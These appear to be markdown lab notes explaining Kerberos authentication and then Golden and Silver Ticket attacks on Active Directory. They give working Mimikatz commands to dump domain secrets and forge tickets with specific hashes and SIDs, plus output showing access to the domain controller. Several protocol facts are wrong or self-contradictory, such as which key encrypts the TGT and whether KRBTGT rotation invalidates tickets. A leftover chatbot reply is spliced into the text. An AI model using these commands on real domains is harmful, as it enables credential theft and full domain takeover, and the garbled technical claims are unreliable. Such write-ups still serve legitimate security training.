### Kerberos Authentication Process

Kerberos is a widely used network authentication protocol designed to provide secure authentication for clients and services in a distributed computing environment. It leverages secret-key cryptography (symmetric key encryption) to enable strong authentication between a client and a service, ensuring both parties are verified without transmitting sensitive information like passwords over the network.

![image](https://github.com/user-attachments/assets/1c78efee-c2fa-4ac3-b136-ffc0b6c9c642)


Here is an overview of the Kerberos authentication process:

![image](https://github.com/user-attachments/assets/6ad30f98-bc72-4312-99c4-afa7b8ce4bb9)

---

#### 1. **User Authentication Request**
The client initiates the authentication process by sending a request to the Domain Controller (DC) for authentication. This request includes a **timestamp** and is **encrypted with the NTLM hash** of the user's account password. The timestamp prevents replay attacks, ensuring that requests cannot be reused later.

#### 2. **Response from Domain Controller: TGT**
The DC receives the request and responds with a **Ticket Granting Ticket (TGT)**. The TGT is **encrypted with the NTLM hash** of the user’s password and also contains an **RC4 encryption** of the Kerberos TGT account (a special account on the DC). The TGT acts as proof that the user has been authenticated.

- **Key Points:**
  - The TGT is encrypted, and only the client that initiated the request (and who knows the correct NTLM hash) can decrypt it.

#### 3. **Client Request for Service Ticket (TGS)**
Once the client receives the TGT, it cannot decrypt it directly. Instead, the client sends the encrypted TGT back to the DC and requests a **Ticket Granting Service (TGS)**. The TGS is a **service ticket** that grants access to specific services (like application servers) within the domain.

#### 4. **Decryption of TGT by the Domain Controller**
The DC decrypts the TGT using its own secret key (the NTLM hash associated with the user's password) and validates the contents. Once decrypted, the DC checks if the TGT is valid and whether the user is authorized to obtain the requested service ticket (TGS).

- **Key Points:**
  - The TGT, once decrypted, is used as validation that the client has been authenticated and authorized to access a service.

#### 5. **Response: Service Ticket (TGS)**
If the TGT is valid, the DC responds with the requested **service ticket (TGS)**. The TGS is encrypted with the NTLM hash of the target service account (the account associated with the application or service the client wants to access, such as an application server).

#### 6. **Client Presents TGS to the Application Server**
The client then presents the **TGS** to the application server. The application server can decrypt the TGS using the NTLM hash of its own service account. Upon successful decryption, the application server uses the TGS to validate the identity and authorization of the client.

- **Key Points:**
  - The application server now knows that the client has been authenticated by the DC, and can make an authorization decision based on the information in the TGS.

---

### Summary of the Kerberos Authentication Process:

1. **Client requests authentication** with the Domain Controller (DC), sending a request with a timestamp encrypted with the user's NTLM hash.
2. The **DC responds with a TGT**, encrypted with the NTLM hash and the RC4 encryption of the TGT account.
3. The **client requests a service ticket (TGS)** using the TGT.
4. The **DC decrypts the TGT**, validates it, and issues the requested service ticket (TGS).
5. The **client presents the TGS** to the application server.
6. The **application server decrypts the TGS**, validates the client’s identity, and decides if the client is authorized to access the service.

---

### Key Concepts in Kerberos:
- **TGT (Ticket Granting Ticket):** A ticket issued by the DC to authenticate the client.
- **TGS (Ticket Granting Service):** A service ticket used to access specific resources or services within the network.
- **NTLM Hash:** A cryptographic representation of the user’s password, used to encrypt and decrypt tickets in the Kerberos process.
- **RC4 Encryption:** A symmetric encryption algorithm used in Kerberos for securing sensitive data.

Kerberos ensures secure and efficient authentication while minimizing the exposure of sensitive information, making it a fundamental part of modern network security.

### Golden Ticket Attack Overview

In Active Directory, a **Golden Ticket** is a forged **Kerberos Ticket Granting Ticket (TGT)** that is created using the **KRBTGT account's password hash**. The **KRBTGT** account is a special service account used by the **Key Distribution Center (KDC)** to encrypt and issue TGTs for other accounts. Since the KRBTGT account’s password is typically not changed for long periods of time, it becomes a valuable target for attackers aiming to maintain persistent access to the domain.

A Golden Ticket allows an attacker to authenticate as **any user or service** within the Active Directory domain, without needing to know their actual passwords. This makes it one of the most powerful tools for attackers, as they can impersonate any domain user, including privileged accounts, and access all resources protected by Kerberos authentication.

### Key Characteristics of a Golden Ticket:
- **Forged TGT**: The attacker forges a TGT using the KRBTGT account's password hash.
- **Impersonation of Any User**: The forged TGT allows the attacker to impersonate any domain user or service.
- **Persistence**: The attacker can maintain access even if the password of the target user or service is changed, as the forged TGT does not rely on the original password.
- **Impact**: Once the attacker has the Golden Ticket, they can access resources, escalate privileges, and maintain stealth in the environment for an extended period.

### Golden Ticket Attack Details:
- **KRBTGT Account**: The KRBTGT account's password hash is the key to generating the Golden Ticket. The KRBTGT password typically remains unchanged for long periods, making it an attractive target.
- **Creation of Golden Ticket**: The attacker can create a valid forged TGT by using the KRBTGT password hash. Since the TGT is signed and encrypted using this hash, it appears legitimate to the Domain Controller.
- **Time-based Validation**: Kerberos authentication does not validate the TGT ticket against the Domain Controller (KDC service) until the TGT has been present for more than **20 minutes**. This gives attackers a window where they can forge a TGT and present it to the DC without immediate detection.
- **Impersonation of Deleted/Revoked Accounts**: Since the DC does not validate the user’s status (whether active, deleted, or revoked) within the first 20 minutes of a TGT's existence, attackers can impersonate **deleted or revoked accounts**.
- **No Impact from Password Changes**: Even if the password of the KRBTGT account is changed after the Golden Ticket is created, the forged TGT remains valid, and the attacker can continue to use it to authenticate.

### Attack Process:

1. **Forge the Golden Ticket**: An attacker obtains the **KRBTGT account's password hash** (typically through tools like **Mimikatz**) and uses it to generate a valid TGT for any user or service they wish to impersonate.
2. **Present the Golden Ticket**: The attacker presents the forged TGT to the **Domain Controller (DC)** when requesting access to resources or services.
3. **TGT Validation**: Since the Golden Ticket is valid (it is signed and encrypted by the KRBTGT account's password hash), the DC does not question its validity.
4. **Access to Resources**: The DC grants the attacker access to any resource or service, as the forged TGT is treated as a legitimate authentication token.

![image](https://github.com/user-attachments/assets/4959d74c-1a80-471d-90c9-71e9e1112f5a)

### Risks of Golden Ticket Attacks:
- **Full Domain Control**: An attacker with a Golden Ticket can gain full control of the domain, including accessing all resources, modifying permissions, and elevating privileges.
- **Persistence**: Golden Tickets can provide long-term access, even after password changes or account deletions, making them a highly persistent attack vector.
- **Bypassing Traditional Security**: The ability to impersonate any user or service without needing their passwords allows attackers to bypass traditional authentication mechanisms and security controls.

### Preventing Golden Ticket Attacks:
1. **Protect the KRBTGT Account**: The **KRBTGT account** should be protected by limiting access and ensuring its password hash is stored securely. Regularly changing the KRBTGT account’s password can mitigate risks associated with long-term exposure.
2. **Password Rotation**: Regularly rotate the KRBTGT account password to invalidate any potential Golden Tickets.
3. **Monitor for Suspicious Activity**: Monitor and analyze logs for signs of unauthorized access, such as unusual authentication patterns or the use of suspicious Kerberos tickets.
4. **Implement Secure Storage**: Ensure sensitive domain data, such as password hashes and service account information, is securely stored and encrypted.
5. **Use Strong Security Controls**: Apply additional security measures such as **Multi-Factor Authentication (MFA)**, **Privileged Access Management (PAM)**, and **network segmentation** to reduce the impact of an attacker gaining access to the domain.

### Golden Ticket Attack - Time and Validation:

- **Time Validation**: After the TGT has been in circulation for more than **20 minutes**, the Domain Controller performs no further validation of the ticket's origin. Therefore, an attacker can still use a forged TGT for up to this period even if the account used in the ticket is no longer active or valid.
  
- **Forging the TGT**: The attacker can manually forge a TGT and present it to the Domain Controller, which will accept it as valid. This is because the DC relies solely on the **KRBTGT account hash** to validate the authenticity of the TGT and does not verify other account statuses until later.

Execute mimikatz on DC as DA to get krbtgt hash 

PS C:\Windows\system32> $sess = New-PSSession -ComputerName dcorp-dc.dollarcorp.moneycorp.local
PS C:\Windows\system32> Invoke-Command -Session $sess -FilePath C:\AD\Tools\Invoke-Mimikatz.ps1
PS C:\Windows\system32> Enter-PSSession $sess     --> bypass mg
[dcorp-dc.dollarcorp.moneycorp.local]: PS C:\Users\svcadmin\Documents> Invoke-Mimikatz -Command '"lsadump::lsa /patch"'

![image](https://github.com/user-attachments/assets/8e4ffd44-9026-495d-8271-d8e6b5053fbc)

![image](https://github.com/user-attachments/assets/5fca76b7-d473-4f7b-841d-b85756e2ca79)

On any machine 

PS C:\AD\Tools> . .\Invoke-Mimikatz.ps1
PS C:\AD\Tools> Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt "'

Verification

PS C:\AD\Tools> klist
```
       Client: Administrator @ dollarcorp.moneycorp.local
        Server: krbtgt/dollarcorp.moneycorp.local @ dollarcorp.moneycorp.local
```
PS C:\AD\Tools> ls \\dcorp-dc.dollarcorp.moneycorp.local\c$
```
    Directory: \\dcorp-dc.dollarcorp.moneycorp.local\c$

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/29/2019   1:32 AM                PerfLogs
d-r---        2/16/2019   9:14 PM                Program Files
d-----        7/16/2016   6:23 AM                Program Files (x86)
d-r---       12/14/2019   8:23 PM                Users
d-----       11/30/2019   1:18 AM                Windows![image](https://github.com/user-attachments/assets/4e1b898c-f40e-41d3-9c7f-74cf6b934ee7)
```
### Conclusion:
A **Golden Ticket** attack is one of the most powerful forms of attack in a Kerberos-based authentication environment. By forging a valid TGT using the KRBTGT account’s password hash, attackers can impersonate any user or service in the domain and maintain persistent access. Protecting the KRBTGT account, regularly changing its password, and monitoring for suspicious activity are critical steps in defending against Golden Ticket attacks.

# Prerequisites for Performing the Silver Ticket Attack

| Prerequisite               | Details                                                                                   |
|----------------------------|-------------------------------------------------------------------------------------------|
| **Service Account Credentials** | Required to create the forged TGT. These credentials are used to access the service account. |
| **Administrative Access**     | Required to gain access to the AD domain controller.                                     |
| **Domain Controller (DC)**   | The attack is performed on a Domain Controller or targeting a specific service.           |
| **Mimikatz Tool**            | Required to dump secrets and manipulate the LSASS process.                              |
| **Privilege Escalation**      | Ability to gain DA (Domain Admin) privileges to execute commands and manipulate the service accounts. |
| **Script or Command Execution** | PowerShell or another scripting tool to run Mimikatz and other necessary commands.        |
| **Targeted Service**         | Identify the specific service to target (e.g., CIFS, RPCSS, WSMan) using the service account credentials. |

Ensure all the above prerequisites are met before attempting to perform the attack.

# Silver Ticket Attack: No Detection Because There is No Interaction with the DC

A Silver Ticket attack is a type of cyber-attack that involves forging a Kerberos Ticket Granting Ticket (TGT) for a specific service in an Active Directory environment. Unlike a Golden Ticket attack, which uses the KRBTGT account's password hash to create a forged TGT, a Silver Ticket attack leverages service account credentials to create the forged TGT.

An attacker who successfully executes a Silver Ticket attack can use the forged TGT to impersonate the targeted service, giving them access to the service's resources and potentially allowing them to move laterally throughout the environment. This attack can be particularly dangerous if the targeted service is highly privileged, such as a domain administrator account.

## Key Points

- **Golden Ticket and Silver Ticket Attacks**: Both involve compromising credentials and abusing the design of the Kerberos protocol.
- **Silver Ticket**: Allows an attacker to forge a Ticket Granting Service (TGS) ticket for a specific service. These TGS tickets are encrypted with the password hash for the service. If an adversary steals the hash for a service account, they can mint TGS tickets for the service.
- **Targeted Services**: In a Silver Ticket attack, the attacker targets services running on a machine using the machine account as the service account.
  - Interesting services include file system (CIFS), hosts that can be used to schedule tasks or RPCSS hosts used by WMI, and WSMan HTTP used by PowerShell remoting, all of which use the machine account as the service account.
- **Service Account Targeting**: The attacker targets the service account in the machine account.

![image](https://github.com/user-attachments/assets/bbb8865b-6c42-4b44-80d9-8578962d4be1)

	1. Services rarely check PAC (Privileged Attribute Certificate).
	2. Services will allow access only to the services themselves.
  3. Reasonable persistence period (default 30 days for computer accounts).

![image](https://github.com/user-attachments/assets/d2a231b0-125c-4bad-8d37-4243855fa52c)

![image](https://github.com/user-attachments/assets/373433d6-a708-4164-bb02-b08259f5733e)

![image](https://github.com/user-attachments/assets/24992ac6-93c5-4cdc-9d21-328902213012)

## Attack Execution

To access the Domain Controller machine account, the attacker uses the `mimikatz` `lsadump` command to retrieve all secrets in the domain, running with domain admin privileges.

### Using Mimikatz to Perform the Attack

1. **Dump Secrets with Mimikatz**:
    ```powershell
    Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
    ```

By dumping the secrets with Mimikatz, the attacker can retrieve the necessary credentials to forge Silver Tickets and gain unauthorized access to specific services within the domain.

This method is particularly stealthy as it does not interact with the Domain Controller directly, making detection much more difficult.

Certainly! Here's the content rewritten in a more organized and readable format for GitHub:

```markdown
# Executing Silver Ticket Attack Using Mimikatz

## Get KRBTGT Hash from Domain Controller (DC)
To execute Mimikatz on DC as Domain Admin (DA) to get the KRBTGT hash:
```powershell
PS C:\Windows\system32> Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -computer dcorp-dc
```

## Access Shares on the DC
Using the hash of the Domain Controller computer account, the below command provides access to shares on the DC.
```powershell
PS C:\Windows\system32> Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:cifs /rc4:82e90bd6e666bc654e50fcbd98e65423 /user:Administrator /ptt"'
```

## Verification
To verify, use the following commands:
```powershell
PS C:\AD\Tools> klist

#0>     Client: Administrator @ dollarcorp.moneycorp.local
        Server: cifs/dcorp-dc.dollarcorp.moneycorp.local @ dollarcorp.moneycorp.local

PS C:\AD\Tools> ls //dcorp-dc.dollarcorp.moneycorp.local\c$
```

## Using Similar Commands for Other Services
Similar commands can be used for any other service on a machine. Services include HOST, RPCSS, WSMAN, and many more.

To execute the command for another service, follow the steps below:
1. Import the Mimikatz script:
    ```powershell
    PS C:\Windows\system32> . C:\AD\Tools\Invoke-Mimikatz.ps1
    ```

2. Use the command to access another service:
    ```powershell
    PS C:\Windows\system32> Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:82e90bd6e666bc654e50fcbd98e65423 /user:Administrator /ptt"'
    ```

3. Verify again:
    ```powershell
    PS C:\Windows\system32> klist
 ```#0>  Client: Administrator @ dollarcorp.moneycorp.local
        Server: HOST/dcorp-dc.dollarcorp.moneycorp.local @ dollarcorp.moneycorp.local

        PS C:\Windows\system32> schtasks /S dcorp-dc.dollarcorp.moneycorp.local

        Folder: \
        TaskName                                 Next Run Time          Status
        ======================================== ====================== ===============
        Browse                                   7/11/2020 2:33:00 AM   Ready
        CreateExplorerShellUnelevatedTask        N/A                    Running
      ```
